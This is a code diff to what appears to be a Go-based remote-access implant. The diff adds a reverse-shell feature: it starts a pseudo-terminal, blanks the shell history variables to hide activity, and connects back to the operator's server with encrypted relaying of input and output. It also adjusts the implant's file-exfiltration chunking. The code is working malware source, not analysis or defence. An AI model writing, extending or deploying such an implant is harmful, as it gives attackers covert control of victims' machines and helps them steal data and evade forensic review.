@@ -9,6 +9,7 @@ import (
 	"crypto/x509"
 	"errors"
 	"fmt"
+	"github.com/creack/pty"
 	"github.com/vmihailenco/msgpack/v5"
 	"gopher/functions"
 	"gopher/utils"
@@ -92,6 +93,9 @@ func TaskProcess(commands [][]byte) [][]byte {
 
 		case utils.COMMAND_SCREENSHOT:
 			data, err = taskScreenshot()
+
+		case utils.COMMAND_TERMINAL_START:
+			jobTerminal(command.Data)
 
 		case utils.COMMAND_TUNNEL_START:
 			jobTunnel(command.Data)
@@ -580,10 +584,9 @@ func jobDownloadStart(paramsData []byte) ([]byte, error) {
 		}
 
 		/// Send Init
-		functions.SendMsg(conn, exfilMsg)
+		_ = functions.SendMsg(conn, exfilMsg)
 
-		//chunkSize := 0x100000 // 1MB
-		chunkSize := 0x10 // 1MB
+		chunkSize := 0x100000 // 1MB
 		totalSize := len(content)
 		for i := 0; i < totalSize; i += chunkSize {
 
@@ -614,7 +617,7 @@ func jobDownloadStart(paramsData []byte) ([]byte, error) {
 
 			sendData, _ := msgpack.Marshal(message)
 			sendData, _ = utils.EncryptData(sendData, utils.SKey)
-			functions.SendMsg(conn, sendData)
+			_ = functions.SendMsg(conn, sendData)
 
 			if finish {
 				break
@@ -927,5 +930,120 @@ func jobTunnel(paramsData []byte) {
 
 		_ = clientConn.Close()
 		_ = srvConn.Close()
+	}()
+}
+
+func jobTerminal(paramsData []byte) {
+	var params utils.ParamsTerminalStart
+	err := msgpack.Unmarshal(paramsData, &params)
+	if err != nil {
+		return
+	}
+
+	go func() {
+
+		process := exec.Command(params.Program)
+		process.Env = append(os.Environ(),
+			"HISTORY=", "HISTSIZE=0", "HISTSAVE=",
+			"HISTZONE=", "HISTLOG=",
+			"HISTFILE=", "HISTFILE=/dev/null",
+			"HISTFILESIZE=0", "TERM=xterm-256color",
+		)
+		windowSize := pty.Winsize{Rows: uint16(params.Height), Cols: uint16(params.Width)}
+
+		active := true
+		status := ""
+
+		ptyProc, err := pty.StartWithSize(process, &windowSize)
+		if err != nil {
+			active = false
+			status = err.Error()
+		}
+		defer ptyProc.Close()
+
+		//////////////////////
+
+		//go func() {
+		//	exitCode := 0
+		//	err := process.Wait()
+		//
+		//	if err != nil {
+		//		exitErr, ok := err.(*exec.ExitError)
+		//		if ok {
+		//			exitCode = exitErr.ExitCode()
+		//		}
+		//	}
+		//}()
+
+		//////////////////////
+
+		var srvConn net.Conn
+		if profile.UseSSL {
+			cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
+			if certerr != nil {
+				return
+			}
+
+			caCertPool := x509.NewCertPool()
+			caCertPool.AppendCertsFromPEM(profile.CaCert)
+
+			config := &tls.Config{
+				Certificates:       []tls.Certificate{cert},
+				RootCAs:            caCertPool,
+				InsecureSkipVerify: true,
+			}
+			srvConn, err = tls.Dial("tcp", profile.Addresses[0], config)
+
+		} else {
+			srvConn, err = net.Dial("tcp", profile.Addresses[0])
+		}
+		if err != nil {
+			return
+		}
+		defer srvConn.Close()
+
+		tunKey := make([]byte, 16)
+		_, _ = rand.Read(tunKey)
+
+		jobPack, _ := msgpack.Marshal(utils.TermPack{Id: uint(AgentId), TermId: params.TermId, Key: tunKey, Alive: active, Status: status})
+		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.JOB_TERMINAL, Data: jobPack})
+		jobMsg, _ = utils.EncryptData(jobMsg, encKey)
+
+		/// Recv Banner
+		if profile.BannerSize > 0 {
+			_, err := functions.ConnRead(srvConn, profile.BannerSize)
+			if err != nil {
+				return
+			}
+		}
+
+		/// Send Init
+		_ = functions.SendMsg(srvConn, jobMsg)
+
+		if !active {
+			return
+		}
+
+		ctx, cancel := context.WithCancel(context.Background())
+		var cancelOnce sync.Once
+		cancelFn := func() { cancelOnce.Do(cancel) }
+
+		var wg sync.WaitGroup
+		wg.Add(2)
+
+		go func() {
+			defer wg.Done()
+			functions.RelayMsgToFile(ctx, cancelFn, srvConn, ptyProc, utils.SKey)
+			_ = process.Process.Kill()
+		}()
+
+		go func() {
+			defer wg.Done()
+			functions.RelayFileToMsg(ctx, cancelFn, ptyProc, srvConn, tunKey)
+			_ = process.Process.Kill()
+		}()
+
+		wg.Wait()
+		fmt.Println("STOPPED")
 	}()
 }
